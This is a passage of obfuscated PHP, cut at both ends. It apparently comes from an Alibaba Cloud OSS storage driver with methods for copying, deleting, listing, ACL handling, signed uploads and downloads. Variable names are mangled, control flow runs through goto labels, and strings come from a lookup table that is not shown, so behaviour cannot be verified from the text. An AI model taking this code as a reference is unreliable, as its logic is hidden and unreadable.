$dø½‘®Øèë); $aö¡‡µ¥ÒÜ[] = $this->client->uploadPartCopy($this->bucket, $bì©ºéºÑµ, $this->bucket, $this->pathEncode($C¹ˆëó¼†½), $eø«å¬†Ÿ, $BÌÁºË‰÷, $c§¢ëéÂÅé); $eø«å¬†Ÿ = $eø«å¬†Ÿ + 1; } goto f¶‰’÷ğ­; A‹‡ì¦œÇ™: $EØˆ©ÕïÍ÷ = array(); if ($f‚ï–ôÂ’ò = $this->hashMd5($bì©ºéºÑµ)) { $EØˆ©ÕïÍ÷ = array(OSS\OssClient::OSS_HEADERS => array($CƒÀË³ÜÍ®[1181] => $f‚ï–ôÂ’ò)); } $BÌÁºË‰÷ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($C¹ˆëó¼†½), $EØˆ©ÕïÍ÷); goto a›ç©”Š½; f¶‰’÷ğ­: $f¶ÄôÊÜ©¿ = array(); foreach ($aö¡‡µ¥ÒÜ as $Dì‹õéäã¥ => $Eõ‘Ö–¸Ôæ) { $f¶ÄôÊÜ©¿[] = array($CƒÀË³ÜÍ®[1185] => $Dì‹õéäã¥ + 1, $CƒÀË³ÜÍ®[1186] => $Eõ‘Ö–¸Ôæ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($C¹ˆëó¼†½), $BÌÁºË‰÷, $f¶ÄôÊÜ©¿); goto b—ÉØÀ±˜; a›ç©”Š½: $eø«å¬†Ÿ = 1; $aË¨¶à×Î = 0; $aö¡‡µ¥ÒÜ = array(); goto AÅ‚ñŒàœæ; b—ÉØÀ±˜: } catch (OSS\Core\OssException $CĞö‰“®õ•) { return !1; } return !0; } public function moveFile($D³ÖÄªÎî, $AÍ±ß¤öñ–) { if ($this->copyFile($D³ÖÄªÎî, $AÍ±ß¤öñ–)) { $this->remove($D³ÖÄªÎî); return $this->getPathOuter($AÍ±ß¤öñ–); } return !1; } public function delFile($EÖòğõğ‘) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($EÖòğõğ‘)); } catch (OSS\Core\OssException $DÍŒß‹Ø«) { return !1; } return !0; } public function delFolder($EÁ°Éø¿) { $D‰Ğˆê—™ó =& $_SERVER[©]; $b„‚ÎÎºŠ = $this->fileList($EÁ°Éø¿); if (!empty($EÁ°Éø¿) && !in_array(trim($EÁ°Éø¿, $D‰Ğˆê—™ó[18]) . $D‰Ğˆê—™ó[18], $b„‚ÎÎºŠ[$D‰Ğˆê—™ó[83]])) { $b„‚ÎÎºŠ[$D‰Ğˆê—™ó[83]][] = trim($EÁ°Éø¿, $D‰Ğˆê—™ó[18]) . $D‰Ğˆê—™ó[18]; } foreach (array_chunk($b„‚ÎÎºŠ[$D‰Ğˆê—™ó[83]], 1000) as $b¡£ö‘ª) { try { $this->client->deleteObjects($this->bucket, $b¡£ö‘ª); } catch (OSS\Core\OssException $Bºêôí¬–ë) { continue; } } return !0; } public function rename($AÙó ‹íğ‘, $BñÀÑÄ„È·) { return $this->renameObject($AÙó ‹íğ‘, $BñÀÑÄ„È·); } private function fileInfo($fÉ‰°ßË¦ù, $Dà ğ­Úó = array()) { goto CÌÄ×ÂÒâ²; CÌÄ×ÂÒâ²: $fÓÄÌ’¹Øˆ =& $_SERVER[©]; $Fïª†Ğø•Ø = array($fÓÄÌ’¹Øˆ[38] => $this->pathThis($fÉ‰°ßË¦ù), $fÓÄÌ’¹Øˆ[85] => $this->getPathOuter($fÉ‰°ßË¦ù), $fÓÄÌ’¹Øˆ[39] => $fÓÄÌ’¹Øˆ[177], $fÓÄÌ’¹Øˆ[197] => 0, $fÓÄÌ’¹Øˆ[117] => 0, $fÓÄÌ’¹Øˆ[87] => 0, $fÓÄÌ’¹Øˆ[170] => $this->ext($fÉ‰°ßË¦ù), $fÓÄÌ’¹Øˆ[198] => !0, $fÓÄÌ’¹Øˆ[199] => !0); if (empty($Dà ğ­Úó)) { $Eê¥òŠ™Ø´ = $this->objectMeta($fÉ‰°ßË¦ù); if (!$Eê¥òŠ™Ø´) { return $Fïª†Ğø•Ø; } $Dà ğ­Úó = array($fÓÄÌ’¹Øˆ[117] => strtotime($Eê¥òŠ™Ø´[$fÓÄÌ’¹Øˆ[1187]]), $fÓÄÌ’¹Øˆ[87] => $Eê¥òŠ™Ø´[$fÓÄÌ’¹Øˆ[1188]] + 0); } goto DÌ§ø‹¡Ïô; EÏÈ¸óÊˆ: return $Fïª†Ğø•Ø; goto bˆøµ÷¾®ù; DÌ§ø‹¡Ïô: if (isset($Dà ğ­Úó[$fÓÄÌ’¹Øˆ[87]])) { $Fïª†Ğø•Ø[$fÓÄÌ’¹Øˆ[87]] = $Dà ğ­Úó[$fÓÄÌ’¹Øˆ[87]]; } if (isset($Dà ğ­Úó[$fÓÄÌ’¹Øˆ[117]])) { $Fïª†Ğø•Ø[$fÓÄÌ’¹Øˆ[117]] = $Dà ğ­Úó[$fÓÄÌ’¹Øˆ[117]]; } if (isset($Dà ğ­Úó[$fÓÄÌ’¹Øˆ[200]]) && !trim($Fïª†Ğø•Ø[$fÓÄÌ’¹Øˆ[117]])) { $Fïª†Ğø•Ø[$fÓÄÌ’¹Øˆ[117]] = $Dà ğ­Úó[$fÓÄÌ’¹Øˆ[200]]; } goto EÏÈ¸óÊˆ; bˆøµ÷¾®ù: } private function folderInfo($cË…ĞÎÉÓ, $D£Ş¢íÁ = array()) { $CÚ…à®ÔîÊ =& $_SERVER[©]; $DÑÀİƒŠË© = array($CÚ…à®ÔîÊ[38] => $this->pathThis($cË…ĞÎÉÓ), $CÚ…à®ÔîÊ[85] => $this->getPathOuter($CÚ…à®ÔîÊ[18] . $cË…ĞÎÉÓ), $CÚ…à®ÔîÊ[39] => $CÚ…à®ÔîÊ[86], $CÚ…à®ÔîÊ[197] => 0, $CÚ…à®ÔîÊ[117] => 0, $CÚ…à®ÔîÊ[198] => !0, $CÚ…à®ÔîÊ[199] => !0); if (empty($D£Ş¢íÁ)) { $cË…ĞÎÉÓ = rtrim($cË…ĞÎÉÓ, $CÚ…à®ÔîÊ[18]) . $CÚ…à®ÔîÊ[18]; $AÈ§Úˆ¥óƒ = $this->objectMeta($cË…ĞÎÉÓ); if (!$AÈ§Úˆ¥óƒ) { return $DÑÀİƒŠË©; } $D£Ş¢íÁ = array($CÚ…à®ÔîÊ[197] => $AÈ§Úˆ¥óƒ[$CÚ…à®ÔîÊ[1189]][$CÚ…à®ÔîÊ[1190]], $CÚ…à®ÔîÊ[117] => strtotime($AÈ§Úˆ¥óƒ[$CÚ…à®ÔîÊ[1187]])); } if (isset($D£Ş¢íÁ[$CÚ…à®ÔîÊ[117]])) { $DÑÀİƒŠË©[$CÚ…à®ÔîÊ[117]] = $D£Ş¢íÁ[$CÚ…à®ÔîÊ[117]]; } if (isset($D£Ş¢íÁ[$CÚ…à®ÔîÊ[197]])) { $DÑÀİƒŠË©[$CÚ…à®ÔîÊ[197]] = $D£Ş¢íÁ[$CÚ…à®ÔîÊ[197]]; } return $DÑÀİƒŠË©; } public function listPath($fÌ¢¤¥Å„, $aÃêëòš¦î = false) { $díÎÁ¤——÷ =& $_SERVER[©]; $f°Í°­Ûù¶ = $this->fileList($fÌ¢¤¥Å„, $díÎÁ¤——÷[18], !0); foreach ($f°Í°­Ûù¶[$díÎÁ¤——÷[84]] as $cëßÓ‡‹îƒ => $E‰—½ÑˆÛ‰) { $f°Í°­Ûù¶[$díÎÁ¤——÷[84]][$cëßÓ‡‹îƒ] = $this->folderInfo($E‰—½ÑˆÛ‰, $E‰—½ÑˆÛ‰); } foreach ($f°Í°­Ûù¶[$díÎÁ¤——÷[83]] as $cëßÓ‡‹îƒ => $E‰—½ÑˆÛ‰) { $f°Í°­Ûù¶[$díÎÁ¤——÷[83]][$cëßÓ‡‹îƒ] = $this->fileInfo($E‰—½ÑˆÛ‰[$díÎÁ¤——÷[38]], $E‰—½ÑˆÛ‰); } return $f°Í°­Ûù¶; } public function has($dÆ±Å¦‹æà, $d¹Û ›™Ü· = false, $c­‹—œ‰› = true) { goto FôÎ¡½ŸƒÊ; FôÎ¡½ŸƒÊ: $Aêæ÷ØÓïË =& $_SERVER[©]; $dÆ±Å¦‹æà = trim($dÆ±Å¦‹æà, $Aêæ÷ØÓïË[18]); $añÜˆç„Ê‘ = empty($dÆ±Å¦‹æà) ? $Aêæ÷ØÓïË[43] : $dÆ±Å¦‹æà . $Aêæ÷ØÓïË[18]; goto FÛšêøùªà; FÛšêøùªà: $e¯“ÚŠë–Í = $Aêæ÷ØÓïË[43]; $DËŠî‚êÊ = 500; $eµ÷ÇÜ÷ = 0; goto Béâøá«½ù; Béâøá«½ù: $AùáèíÑİÛ = 0; while (!0) { $eï™–Ô«Ä˜ = array($Aêæ÷ØÓïË[1178] => $Aêæ÷ØÓïË[18], $Aêæ÷ØÓïË[196] => $añÜˆç„Ê‘, $Aêæ÷ØÓïË[1179] => $DËŠî‚êÊ, $Aêæ÷ØÓïË[1180] => $e¯“ÚŠë–Í); try { $B¼áîìÙŸ  = $this->client->listObjects($this->bucket, $eï™–Ô«Ä˜); } catch (OSS\Core\OssException $A‹½ÂÃ™ù) { break; } $e¯“ÚŠë–Í = $B¼áîìÙŸ ->getNextMarker(); $D®Ö §¼’• = $B¼áîìÙŸ ->getObjectList(); $eğ‚ÔÆñô˜ = $B¼áîìÙŸ ->getPrefixList(); if ($d¹Û ›™Ü·) { if (count($D®Ö §¼’•) > 1 || count($D®Ö §¼’•) == 1 && $D®Ö §¼’•[0]->getKey() != $añÜˆç„Ê‘) { $eµ÷ÇÜ÷ += count($D®Ö §¼’•) - 1; } if (!empty($eğ‚ÔÆñô˜)) { $AùáèíÑİÛ += count($eğ‚ÔÆñô˜); } if ($e¯“ÚŠë–Í === $Aêæ÷ØÓïË[43]) { break; } continue; } if ($c­‹—œ‰›) { if (!empty($D®Ö §¼’•)) { if (count($D®Ö §¼’•) > 1 || $D®Ö §¼’•[0]->getKey() != $añÜˆç„Ê‘) { return !0; } } } else { if (!empty($eğ‚ÔÆñô˜)) { return !0; } } if ($e¯“ÚŠë–Í === $Aêæ÷ØÓïË[43]) { break; } } if ($d¹Û ›™Ü·) { return array($Aêæ÷ØÓïË[201] => $eµ÷ÇÜ÷, $Aêæ÷ØÓïË[202] => $AùáèíÑİÛ); } goto EğÂøŸÕÔŞ; EğÂøŸÕÔŞ: return !1; goto aù²°«õ¡‘; aù²°«õ¡‘: } public function listAll($b¿®ª§Ëáˆ) { $AÂª¦„‘Æé =& $_SERVER[©]; $dßöº£ÇÎ• = $this->fileList($b¿®ª§Ëáˆ, $AÂª¦„‘Æé[43], !0); $C„Œó©®ß¼ = array(); foreach ($dßöº£ÇÎ•[$AÂª¦„‘Æé[83]] as $bº¶ˆ‚ùŒ) { $C„Œó©®ß¼[$bº¶ˆ‚ùŒ[$AÂª¦„‘Æé[38]]] = $bº¶ˆ‚ùŒ[$AÂª¦„‘Æé[87]]; } return $this->listAllFiles($b¿®ª§Ëáˆ, array_keys($C„Œó©®ß¼), $C„Œó©®ß¼); } public function canRead($EöŠ‘éÄ«ë) { $DÎÚ»íÊ’ä =& $_SERVER[©]; $A„¤ÎÍÀÓ‰ = $this->pathAcl($EöŠ‘éÄ«ë); return $A„¤ÎÍÀÓ‰ == $DÎÚ»íÊ’ä[1191] || $A„¤ÎÍÀÓ‰ == $DÎÚ»íÊ’ä[499] ? !0 : !1; } public function canWrite($Eöó†ŠïÊ¼) { $eº¸ìŠ–—¦ = $this->pathAcl($Eöó†ŠïÊ¼); return $eº¸ìŠ–—¦ == $_SERVER[©][499] ? !0 : !1; } public function pathAcl($bĞÊ’éô£©) { goto BœÑğœâ¯¡; bä¢÷Î¡ù÷: return $Cáƒò…¿›ê; goto cæã¦ÌÔ‡; BœÑğœâ¯¡: $aËÕÔÆÑš‘ =& $_SERVER[©]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $e¹±õíêî´ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($bĞÊ’éô£©)); } catch (OSS\Core\OssException $b÷¿‘œˆåÃ) { return !1; } goto fØêŒˆëä; fØêŒˆëä: $Cáƒò…¿›ê = $e¹±õíêî´ == $aËÕÔÆÑš‘[44] ? $this->bucketAcl : $e¹±õíêî´; if ($Cáƒò…¿›ê == $aËÕÔÆÑš‘[1192]) { return $aËÕÔÆÑš‘[1191]; } if ($Cáƒò…¿›ê == $aËÕÔÆÑš‘[1193]) { return $aËÕÔÆÑš‘[499]; } goto bä¢÷Î¡ù÷; cæã¦ÌÔ‡: } private function chmodPath($f”äÁ¤Ç¿, $cËË­ã«¢ö = '') { $F¶ˆ¸‘Ô¬á =& $_SERVER[©]; $A«÷¢çŠ–Ä = empty($cËË­ã«¢ö) ? $F¶ˆ¸‘Ô¬á[1193] : $cËË­ã«¢ö; $FĞ˜½¬ÚÊ¿ = array($F¶ˆ¸‘Ô¬á[44], $F¶ˆ¸‘Ô¬á[195], $F¶ˆ¸‘Ô¬á[1192], $F¶ˆ¸‘Ô¬á[1193]); if (!in_array($A«÷¢çŠ–Ä, $FĞ˜½¬ÚÊ¿)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($f”äÁ¤Ç¿), $A«÷¢çŠ–Ä); } catch (OSS\Core\OssException $BàÑØ÷±¸) { return !1; } return !0; } public function getContent($e‚•Ä’Æ¡Û) { return $this->fileSubstr($e‚•Ä’Æ¡Û, -1); } public function setContent($AÔÛÄï˜Â, $E†›¯Õ¸ÒÛ = '') { $b×‡ÃšÛÀŞ =& $_SERVER[©]; try { $CŠ”îŸæä  = $this->trafficLimit($b×‡ÃšÛÀŞ[1194]); $Bã™¡£Ÿ¼ß = $this->client->putObject($this->bucket, $this->pathEncode($AÔÛÄï˜Â), $E†›¯Õ¸ÒÛ, $CŠ”îŸæä ); } catch (OSS\Core\OssException $B®–æçØˆ) { return !1; } $c¥¨¦ŒÍô = array($b×‡ÃšÛÀŞ[1181] => trim($Bã™¡£Ÿ¼ß[$b×‡ÃšÛÀŞ[1195]], $b×‡ÃšÛÀŞ[123]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($AÔÛÄï˜Â))); $this->updateObjMeta($AÔÛÄï˜Â, $c¥¨¦ŒÍô); return isset($Bã™¡£Ÿ¼ß[$b×‡ÃšÛÀŞ[1196]][$b×‡ÃšÛÀŞ[1143]]) ? (int) $Bã™¡£Ÿ¼ß[$b×‡ÃšÛÀŞ[1196]][$b×‡ÃšÛÀŞ[1143]] : strlen($Bã™¡£Ÿ¼ß); } private function updateObjMeta($bÖ¢‘ŞôÃ, $bÌõ†³îìŠ) { $bÖ¢‘ŞôÃ = $this->pathEncode($bÖ¢‘ŞôÃ); try { $c†Ñ‡ŠéòÃ = array(OSS\OssClient::OSS_HEADERS => $bÌõ†³îìŠ); $this->client->copyObject($this->bucket, $bÖ¢‘ŞôÃ, $this->bucket, $bÖ¢‘ŞôÃ, $c†Ñ‡ŠéòÃ); } catch (OSS\Core\OssException $eµÛ²óÄî) { return !1; } return !0; } public function upload($B¹¾â¦·ëˆ, $CÒˆŠÊœ˜¤, $a“·É…Ï– = false, $E†¢¦²è = REPEAT_REPLACE) { $FÇğ÷õ—ø¤ =& $_SERVER[©]; $c×«ˆ½‚“ = trim($B¹¾â¦·ëˆ, $FÇğ÷õ—ø¤[18]); $AÕĞ®­ò¿ß = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($FÇğ÷õ—ø¤[1181] => @md5_file($CÒˆŠÊœ˜¤)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($B¹¾â¦·ëˆ))); $AÕĞ®­ò¿ß = $this->trafficLimit($FÇğ÷õ—ø¤[1194], $AÕĞ®­ò¿ß); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($c×«ˆ½‚“), $CÒˆŠÊœ˜¤, $AÕĞ®­ò¿ß); } catch (OSS\Core\OssException $BÄŸøç¨„«) { return !1; } return $this->getPathOuter($B¹¾â¦·ëˆ); } public function getHost() { $f…äÅæŸ°† =& $_SERVER[©]; $BÓ†õ„ªÖÅ = explode($f…äÅæŸ°†[181], parent::getHost()); return $BÓ†õ„ªÖÅ[0] . $f…äÅæŸ°†[181] . $this->bucket . $f…äÅæŸ°†[101] . $BÓ†õ„ªÖÅ[1]; } public function uploadFormData($AÕ©×éÑÇ‡, $CÇÃè‰†ïó = 3600) { goto bÍ¢½¡Ù‹; cŠø¥±ª¤ˆ: $aª§¨‹ã¥ = date($Fğñ„†Ìóƒ[1197], time() + $dËÉ½Ø¿Ó‘); $fŒ±Ö²”¶¼ = new DateTime($aª§¨‹ã¥); $A‘í¤‘â‰‘ = $fŒ±Ö²”¶¼->format(DateTime::ISO8601); goto dí¦Ì¾¸ƒ¤; bÍ¢½¡Ù‹: $Fğñ„†Ìóƒ =& $_SERVER[©]; if (!($bÇ·¾”©¸ø = $this->getHost())) { return !1; } $dËÉ½Ø¿Ó‘ = $CÇÃè‰†ïó; goto cŠø¥±ª¤ˆ; eÆì“¤õ¨: $Bª†Ö³İÜŞ = base64_encode(hash_hmac($Fğñ„†Ìóƒ[227], $e÷¦„äåÉŒ, $this->secret, !0)); $D±¨­Ê˜… = array($Fğñ„†Ìóƒ[1109] => $e÷¦„äåÉŒ, $Fğñ„†Ìóƒ[1200] => $this->accessKey, $Fğñ„†Ìóƒ[1105] => $Fğñ„†Ìóƒ[1097], $Fğñ„†Ìóƒ[1201] => $Bª†Ö³İÜŞ, $Fğñ„†Ìóƒ[179] => $bÇ·¾”©¸ø); $D±¨­Ê˜… = $this->trafficLimit($Fğñ„†Ìóƒ[1194], $D±¨­Ê˜…); goto fçÌÜÏÑèÇ; fçÌÜÏÑèÇ: return $D±¨­Ê˜…; goto B®¬†³ã¡¶; d«ø“¥ÅÀ¦: $b¹·øªáéÏ = $this->pathFather($AÕ©×éÑÇ‡); $D‡–¦ÉØÛŞ = array($Fğñ„†Ìóƒ[1099] => $A‘í¤‘â‰‘, $Fğñ„†Ìóƒ[1100] => array(array($Fğñ„†Ìóƒ[1199], 0, $eïóí‰…’‘), array($Fğñ„†Ìóƒ[1103], $Fğñ„†Ìóƒ[1104], $b¹·øªáéÏ))); $e÷¦„äåÉŒ = base64_encode(json_encode($D‡–¦ÉØÛŞ)); goto eÆì“¤õ¨; dí¦Ì¾¸ƒ¤: $A¬’ç´ß´Ê = strpos($A‘í¤‘â‰‘, $Fğñ„†Ìóƒ[293]); $A‘í¤‘â‰‘ = substr($A‘í¤‘â‰‘, 0, $A¬’ç´ß´Ê) . $Fğñ„†Ìóƒ[1198]; $eïóí‰…’‘ = 1048576000 * 5; goto d«ø“¥ÅÀ¦; B®¬†³ã¡¶: } public function multiUploadFormData($D¶ÃÂ”×æ¶, $A¯Ğ®ˆÌ±† = 3600) { $C†ÖçÌææÌ =& $_SERVER[©]; if (!($A°¨¶äóÍ¬ = $this->getHost())) { return !1; } $f—µ‡¯‚ = $this->trafficLimit($C†ÖçÌææÌ[1194]); $fŒ”¦¿ÛÚ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D¶ÃÂ”×æ¶), $f—µ‡¯‚); return array($C†ÖçÌææÌ[219] => $fŒ”¦¿ÛÚ, $C†ÖçÌææÌ[179] => $A°¨¶äóÍ¬ . $C†ÖçÌææÌ[18] . $this->pathEncode($D¶ÃÂ”×æ¶), $C†ÖçÌææÌ[220] => gmdate($C†ÖçÌææÌ[1202]), $C†ÖçÌææÌ[99] => $D¶ÃÂ”×æ¶); } public function multiUploadAuthData($e˜ˆßŠŞ, $f£–ŒùöË­ = array()) { goto A†œà¨ˆ–; A†œà¨ˆ–: $a‚¬á´¸²¿ =& $_SERVER[©]; $cÂ³‚ñŒâ¹ = isset($f£–ŒùöË­[$a‚¬á´¸²¿[220]]) ? $f£–ŒùöË­[$a‚¬á´¸²¿[220]] : gmdate($a‚¬á´¸²¿[1202]); $DÅ©ÑŒ–ì÷ = isset($f£–ŒùöË­[$a‚¬á´¸²¿[170]]) ? $f£–ŒùöË­[$a‚¬á´¸²¿[170]] : $a‚¬á´¸²¿[43]; goto dßîã„ö·‡; E³É‘Î•ô¡: if (!empty($f£–ŒùöË­[$a‚¬á´¸²¿[1204]])) { $cã§œŠ½ÂÒ = array_merge(array($Fá¨Œ¥Áˆ·[4]), $f£–ŒùöË­[$a‚¬á´¸²¿[1204]]); sort($cã§œŠ½ÂÒ); $Fá¨Œ¥Áˆ·[4] = implode($a‚¬á´¸²¿[9], $cã§œŠ½ÂÒ); } $A’Ïù½Î… = implode($a‚¬á´¸²¿[9], $Fá¨Œ¥Áˆ·); $D¯ë„½ôŒ = base64_encode(hash_hmac($a‚¬á´¸²¿[227], $A’Ïù½Î…, $this->secret, !0)); goto F–—ˆ¡ä‹ç; F–—ˆ¡ä‹ç: $fµŠÏ´”íŒ = $a‚¬á´¸²¿[1205] . $this->accessKey . $a‚¬á´¸²¿[14] . $D¯ë„½ôŒ; if (strpos($DÅ©ÑŒ–ì÷, $a‚¬á´¸²¿[223]) === 0) { $fµŠÏ´”íŒ = array($a‚¬á´¸²¿[229] => $fµŠÏ´”íŒ, $a‚¬á´¸²¿[220] => $cÂ³‚ñŒâ¹); if ($aÒòíŞø—) { $fµŠÏ´”íŒ = array_merge($fµŠÏ´”íŒ, $aÒòíŞø—); } } return $fµŠÏ´”íŒ; goto DŒßŠÑŠ; b¨…£‚²ñ²: $Fá¨Œ¥Áˆ· = array($a‚¬á´¸²¿[222], $a‚¬á´¸²¿[43], $a‚¬á´¸²¿[126], $cÂ³‚ñŒâ¹, "\x78\x2d\157\x73\x73\x2d\x64\x61\164\x65\72{$cÂ³‚ñŒâ¹}", $a‚¬á´¸²¿[18] . $this->bucket . $a‚¬á´¸²¿[18] . $AéÔíÊ­÷ß . $DÅ©ÑŒ–ì÷); if (strpos($DÅ©ÑŒ–ì÷, $a‚¬á´¸²¿[223]) === 0) { $Fá¨Œ¥Áˆ·[0] = $a‚¬á´¸²¿[224]; if ($aÒòíŞø— = $this->trafficLimit($a‚¬á´¸²¿[1194])) { $AéÔíÊ­÷ß = $a‚¬á´¸²¿[1203]; array_splice($Fá¨Œ¥Áˆ·, 5, 0, $AéÔíÊ­÷ß . $a‚¬á´¸²¿[14] . $aÒòíŞø—[$AéÔíÊ­÷ß]); } } if (isset($f£–ŒùöË­[$a‚¬á´¸²¿[225]]) && $f£–ŒùöË­[$a‚¬á´¸²¿[225]] == $a‚¬á´¸²¿[226]) { $Fá¨Œ¥Áˆ·[0] = $a‚¬á´¸²¿[226]; } goto E³É‘Î•ô¡; dßîã„ö·‡: $AéÔíÊ­÷ß = $e˜ˆßŠŞ; if (isset($f£–ŒùöË­[$a‚¬á´¸²¿[99]])) { $AéÔíÊ­÷ß = $f£–ŒùöË­[$a‚¬á´¸²¿[99]]; unset($f£–ŒùöË­[$a‚¬á´¸²¿[99]]); } if (isset($f£–ŒùöË­[$a‚¬á´¸²¿[221]])) { $f£–ŒùöË­[$a‚¬á´¸²¿[220]] = $cÂ³‚ñŒâ¹; return $this->listUploadParts($AéÔíÊ­÷ß, $f£–ŒùöË­); } goto b¨…£‚²ñ²; DŒßŠÑŠ: } public function listUploadParts($dªŠã‰¿¦, $bµ†Œô¼×¡) { goto DĞªñââÔ; Bõˆ¹¿–ã“: unset($bµ†Œô¼×¡[$EØÜ™•ø†‚[221]], $bµ†Œô¼×¡[$EØÜ™•ø†‚[225]]); $fïö™º = $this->multiUploadAuthData($dªŠã‰¿¦, $bµ†Œô¼×¡); if (empty($fïö™º)) { return !1; } goto E‰åÊçìô; E‰åÊçìô: return array($EØÜ™•ø†‚[229] => $fïö™º, $EØÜ™•ø†‚[220] => $bµ†Œô¼×¡[$EØÜ™•ø†‚[220]], $EØÜ™•ø†‚[231] => $D×éé‰Ê¬¯); goto D„â–øÉ‚; Cë÷¾ÏÇÉ: $bìÑ’Ïƒ¿ = $A²Ÿå¯âÛ¾->getListPart(); $D×éé‰Ê¬¯ = array(); foreach ($bìÑ’Ïƒ¿ as $C¡Å¶É«î) { $D×éé‰Ê¬¯[] = array($EØÜ™•ø†‚[1185] => $C¡Å¶É«î->getPartNumber(), $EØÜ™•ø†‚[1186] => trim($C¡Å¶É«î->getETag(), $EØÜ™•ø†‚[123])); } goto Bõˆ¹¿–ã“; DĞªñââÔ: $EØÜ™•ø†‚ =& $_SERVER[©]; $cÛ‡“¸õÓĞ = parse_url_query($bµ†Œô¼×¡[$EØÜ™•ø†‚[170]]); $A²Ÿå¯âÛ¾ = $this->client->listParts($this->bucket, $this->pathEncode($dªŠã‰¿¦), $cÛ‡“¸õÓĞ[$EØÜ™•ø†‚[219]]); goto Cë÷¾ÏÇÉ; D„â–øÉ‚: } public function download($bÌßèæëÇ, $e’Õ¦º™†·) { if ($this->isFolder($bÌßèæëÇ)) { return !1; } try { $CÛ†ó—ÅàÓ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $e’Õ¦º™†·); $CÛ†ó—ÅàÓ = $this->trafficLimit($_SERVER[©][115], $CÛ†ó—ÅàÓ); $this->client->getObject($this->bucket, $this->pathEncode($bÌßèæëÇ), $CÛ†ó—ÅàÓ); } catch (OSS\Core\OssException $bŒóİ«„½) { return !1; } return $e’Õ¦º™†·; } public function fileSubstr($AáÀÇèÛõ¸, $BİŒÔ³ÌŠ© = 0, $d»š¿Š®Ş’ = false) { if ($BİŒÔ³ÌŠ© === -1) { $AøºÌÅÑƒ = array(); } else { if ($d»š¿Š®Ş’ === !1) { $c¢ãôŒÃİÍ = $this->size($AáÀÇèÛõ¸); } else { $c¢ãôŒÃİÍ = $BİŒÔ³ÌŠ© + $d»š¿Š®Ş’ - 1; } $AøºÌÅÑƒ = array(OSS\OssClient::OSS_RANGE => "{$BİŒÔ³ÌŠ©}\55{$c¢ãôŒÃİÍ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($AáÀÇèÛõ¸), $AøºÌÅÑƒ); } catch (OSS\Core\OssException $eÓÍˆ®¬¨ì) { think_exception($eÓÍˆ®¬¨ì->getMessage()); return !1; } } private function trafficLimit($BÔ¸ÁøîøÑ, $B‰³ŸÔ¹Ç = array()) { goto A½ƒÀé£È; A½ƒÀé£È: $e¾³Î¨Öˆ =& $_SERVER[©]; if ($BÔ¸ÁøîøÑ == $e¾³Î¨Öˆ[1194] && $this->isUploadServer() || $BÔ¸ÁøîøÑ == $e¾³Î¨Öˆ[115] && $this->isFileOutServer()) { return $B‰³ŸÔ¹Ç; } $d´£ìÜ¶í• = floatval($GLOBALS[$e¾³Î¨Öˆ[16]][$e¾³Î¨Öˆ[94]][$e¾³Î¨Öˆ[113]][$BÔ¸ÁøîøÑ]) * 1024 * 1024 * 8; goto F¼¡•ßù¤è; F¼¡•ßù¤è: if (!$d´£ìÜ¶í•) { return $B‰³ŸÔ¹Ç; } $d´£ìÜ¶í• = $d´£ìÜ¶í• < 819200 ? 819200 : ($d´£ìÜ¶í• > 838860800 ? 838860800 : $d´£ìÜ¶í•); $B‰³ŸÔ¹Ç[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($d´£ìÜ¶í•); goto F†–½æØèÔ; F†–½æØèÔ: return $B‰³ŸÔ¹Ç; goto EïƒÁÀÏ¢Ÿ; EïƒÁÀÏ¢Ÿ: } public function link($d§»Ø¥Ô‘Ü, $a™–à¼÷» = array()) { $cÖ„À£Æ· =& $_SERVER[©]; if (!$this->exist($d§»Ø¥Ô‘Ü) || $this->isFolder($d§»Ø¥Ô‘Ü)) { return !1; } try { $a™–à¼÷» = $this->trafficLimit($cÖ„À£Æ·[115], $a™–à¼÷»); $B—÷šõÙ†ˆ = $this->client->signUrl($this->bucket, $this->pathEncode($d§»Ø¥Ô‘Ü), 3600 * 12, $cÖ„À£Æ·[226], $a™–à¼÷»); return $this->getCdnLink($B—÷šõÙ†ˆ); } catch (OSS\Core\OssException $D²Õ˜¸íÊ¶) { return !1; } } public function fileOut($CˆÆ›œí¾‡, $B“³œâÌ¨ = false, $fÈ¿—¢¹äÈ = false, $DòƒùƒÃŞ¡ = '') { goto B¹Ê¶åßğğ; d‚ÑÒëæ¢ë: $féÙÊµò™® = get_file_mime(get_path_ext($fÈ¿—¢¹äÈ)); if ($féÙÊµò™® == $AÚšŞÒ‚‰[211]) { return parent::fileOut($CˆÆ›œí¾‡, $B“³œâÌ¨, $fÈ¿—¢¹äÈ, $DòƒùƒÃŞ¡); } $B“³œâÌ¨ = $B“³œâÌ¨ ? $AÚšŞÒ‚‰[212] : $AÚšŞÒ‚‰[213]; goto eÃÁ÷‘øˆ; dø¥Š°½°”: $this->fileOutLink($BŞ³ÕÒÕçĞ); goto F‹„æÌƒª; B¹Ê¶åßğğ: $AÚšŞÒ‚‰ =& $_SERVER[©]; if (!$fÈ¿—¢¹äÈ) { $fÈ¿—¢¹äÈ = $this->pathThis($CˆÆ›œí¾‡); } $fÈ¿—¢¹äÈ = rawurlencode($fÈ¿—¢¹äÈ); goto d‚ÑÒëæ¢ë; eÃÁ÷‘øˆ: $e„¦ÜÕÊóŸ = array(OSS\OssClient::OSS_SUB_RESOURCE => $AÚšŞÒ‚‰[1206] . rawurlencode("{$B“³œâÌ¨}\73\x66\151\x6c\145\156\141\x6d\145\x3d{$fÈ¿—¢¹äÈ}")); $e„¦ÜÕÊóŸ[OSS\OssClient::OSS_SUB_RESOURCE] .= $AÚšŞÒ‚‰[1207] . rawurlencode($féÙÊµò™®); $BŞ³ÕÒÕçĞ = $this->link($CˆÆ›œí¾‡, $e„¦ÜÕÊóŸ); goto dø¥Š°½°”; F‹„æÌƒª: } public function 